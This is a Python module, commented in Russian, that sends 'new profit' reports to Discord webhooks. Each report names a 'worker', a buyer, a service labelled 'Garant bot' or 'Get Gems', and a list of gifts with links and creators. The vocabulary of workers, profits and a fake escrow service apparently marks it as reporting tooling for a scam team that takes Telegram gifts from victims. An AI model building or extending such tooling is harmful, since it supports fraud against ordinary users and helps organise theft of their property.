"""
Модуль для отправки логов в Discord через webhook
"""
import os
import logging
import requests
import aiohttp
from typing import List, Dict, Optional
from datetime import datetime

logger = logging.getLogger(__name__)

# URL webhook из переменной окружения
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
DISCORD_PROFIT_WEBHOOK_URL = os.getenv("DISCORD_PROFIT_WEBHOOK_URL", "")

def send_profit_log(buyer_username: str, deal_id: int, gifts: List[Dict], image_url: str = "https://i.ibb.co/XfHRzHfw/newprofin.jpg") -> bool:
    """
    Отправить лог о профите в Discord через webhook
    
    Args:
        buyer_username: Username покупателя (без @)
        deal_id: ID сделки
        gifts: Список подарков (словари с информацией о подарках)
        image_url: URL изображения для вложения
    
    Returns:
        bool: True если успешно отправлено, False в противном случае
    """
    if not DISCORD_WEBHOOK_URL:
        logger.warning("DISCORD_WEBHOOK_URL not configured, skipping profit log")
        return False
    
    try:
        # Формируем имя покупателя
        buyer_name = buyer_username
        if buyer_name and not buyer_name.startswith('@'):
            buyer_name = f"@{buyer_name}"
        
        # Формируем список подарков
        gift_list_text = ""
        if gifts:
            for i, gift in enumerate(gifts, 1):
                gift_name = gift.get('gift_name', 'Неизвестно')
                gift_number = gift.get('gift_number', '')
                gift_link = gift.get('gift_link', '')
                creator_name = gift.get('sender_username', 'Неизвестно')
                
                # Формируем строку с подарком
                gift_item = f"{i}. {gift_link}" if gift_link else f"{i}. {gift_name}"
                if gift_number:
                    gift_item += f" #{gift_number}"
                gift_item += f" (создал: {creator_name})"
                gift_list_text += f"{gift_item}\n"
        else:
            gift_list_text = "Нет подарков"
        
        # Формируем сообщение в формате как на скриншоте
        content = (
            f"🟥 Новый профит у {buyer_name}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 Сервис: Garant bot\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎁 Подарки ({len(gifts)}):\n"
            f"{gift_list_text}"
        )
        
        # Формируем payload для Discord webhook
        payload = {
            "content": content,
            "embeds": [
                {
                    "image": {
                        "url": image_url
                    }
                }
            ]
        }
        
        # Отправляем запрос
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=payload,
            timeout=10
        )
        
        if response.status_code == 204 or response.status_code == 200:
            logger.info(f"✅ Profit log sent to Discord webhook for deal #{deal_id}")
            return True
        else:
            logger.error(f"❌ Failed to send profit log to Discord webhook: {response.status_code} {response.text[:200]}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Error sending profit log to Discord webhook: {e}", exc_info=True)
        return False


async def send_profit_log_with_buyer(seller_id: int, buyer_username: str, gifts: List[Dict], image_url: str = "https://i.ibb.co/XfHRzHfw/newprofin.jpg") -> bool:
    """
    Отправить лог о профите в Discord через отдельный webhook для профита
    Привязан к покупателю с последней завершенной сделки продавца
    
    Args:
        seller_id: ID продавца (telegram_id)
        buyer_username: Username покупателя (без @)
        gifts: Список подарков (словари с информацией о подарках)
        image_url: URL изображения для вложения
    
    Returns:
        bool: True если успешно отправлено, False в противном случае
    """
    # Используем отдельный webhook для профита, если задан, иначе используем основной
    webhook_url = DISCORD_PROFIT_WEBHOOK_URL or DISCORD_WEBHOOK_URL
    
    if not webhook_url:
        logger.warning("DISCORD_PROFIT_WEBHOOK_URL and DISCORD_WEBHOOK_URL not configured, skipping profit log")
        return False
    
    try:
        # Получаем информацию о продавце/воркере из БД
        from database import Database
        db = Database()
        seller_user = db.get_user_by_telegram_id(seller_id)
        
        seller_name = "Неизвестно"
        seller_username_display = "Неизвестно"
        if seller_user:
            seller_first_name = seller_user.get('first_name', '')
            seller_last_name = seller_user.get('last_name', '')
            seller_username = seller_user.get('username', '')
            
            # Формируем имя продавца
            if seller_first_name or seller_last_name:
                seller_name = f"{seller_first_name} {seller_last_name}".strip()
            else:
                seller_name = "Без имени"
            
            # Формируем username продавца
            if seller_username:
                seller_username_display = f"@{seller_username}"
            else:
                seller_username_display = f"ID: {seller_id}"
        else:
            seller_username_display = f"ID: {seller_id}"
        
        # Формируем имя покупателя
        buyer_name = buyer_username
        if buyer_name and buyer_name != "Неизвестно":
            if not buyer_name.startswith('@'):
                buyer_name = f"@{buyer_name}"
        else:
            buyer_name = "Неизвестно"
        
        # Формируем список подарков для embed
        gift_list_text = ""
        if gifts and len(gifts) > 0:
            for i, gift in enumerate(gifts, 1):
                gift_name = gift.get('gift_name', 'Неизвестно')
                gift_number = gift.get('gift_number', '')
                gift_link = gift.get('gift_link', '')
                creator_name = gift.get('sender_username', 'Неизвестно')
                
                # Формируем строку с подарком
                if gift_link:
                    gift_item = f"{i}. [{gift_name}]({gift_link})"
                else:
                    gift_item = f"{i}. {gift_name}"
                    if gift_number:
                        gift_item += f" #{gift_number}"
                
                if creator_name and creator_name != 'Неизвестно':
                    if not creator_name.startswith('@'):
                        creator_name = f"@{creator_name}"
                    gift_item += f" (создал: {creator_name})"
                
                gift_list_text += f"{gift_item}\n"
        else:
            gift_list_text = "Нет подарков"
        
        # Формируем embed для Discord webhook
        embed = {
            "title": "🟥 Новый профит",
            "color": 0xFF0000,  # Красный цвет
            "fields": [
                {
                    "name": "👤 Воркер",
                    "value": f"{seller_name} ({seller_username_display})",
                    "inline": True
                },
                {
                    "name": "🛒 Покупатель",
                    "value": buyer_name,
                    "inline": True
                },
                {
                    "name": "💎 Сервис",
                    "value": "Get Gems",
                    "inline": True
                },
                {
                    "name": f"🎁 Подарки ({len(gifts) if gifts else 0})",
                    "value": gift_list_text if gift_list_text else "Нет подарков",
                    "inline": False
                }
            ],
            "image": {
                "url": image_url
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Формируем payload для Discord webhook
        payload = {
            "embeds": [embed]
        }
        
        # Отправляем асинхронный запрос
        async with aiohttp.ClientSession() as session:
            async with session.post(
                webhook_url,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                if response.status == 204 or response.status == 200:
                    logger.info(f"✅ Profit log sent to Discord webhook for seller {seller_id} ({seller_username_display}) with buyer {buyer_username}, gifts: {len(gifts) if gifts else 0}")
                    return True
                else:
                    response_text = await response.text()
                    logger.error(f"❌ Failed to send profit log to Discord webhook: {response.status} {response_text[:200]}")
                    return False
            
    except Exception as e:
        logger.error(f"❌ Error sending profit log to Discord webhook: {e}", exc_info=True)
        return False

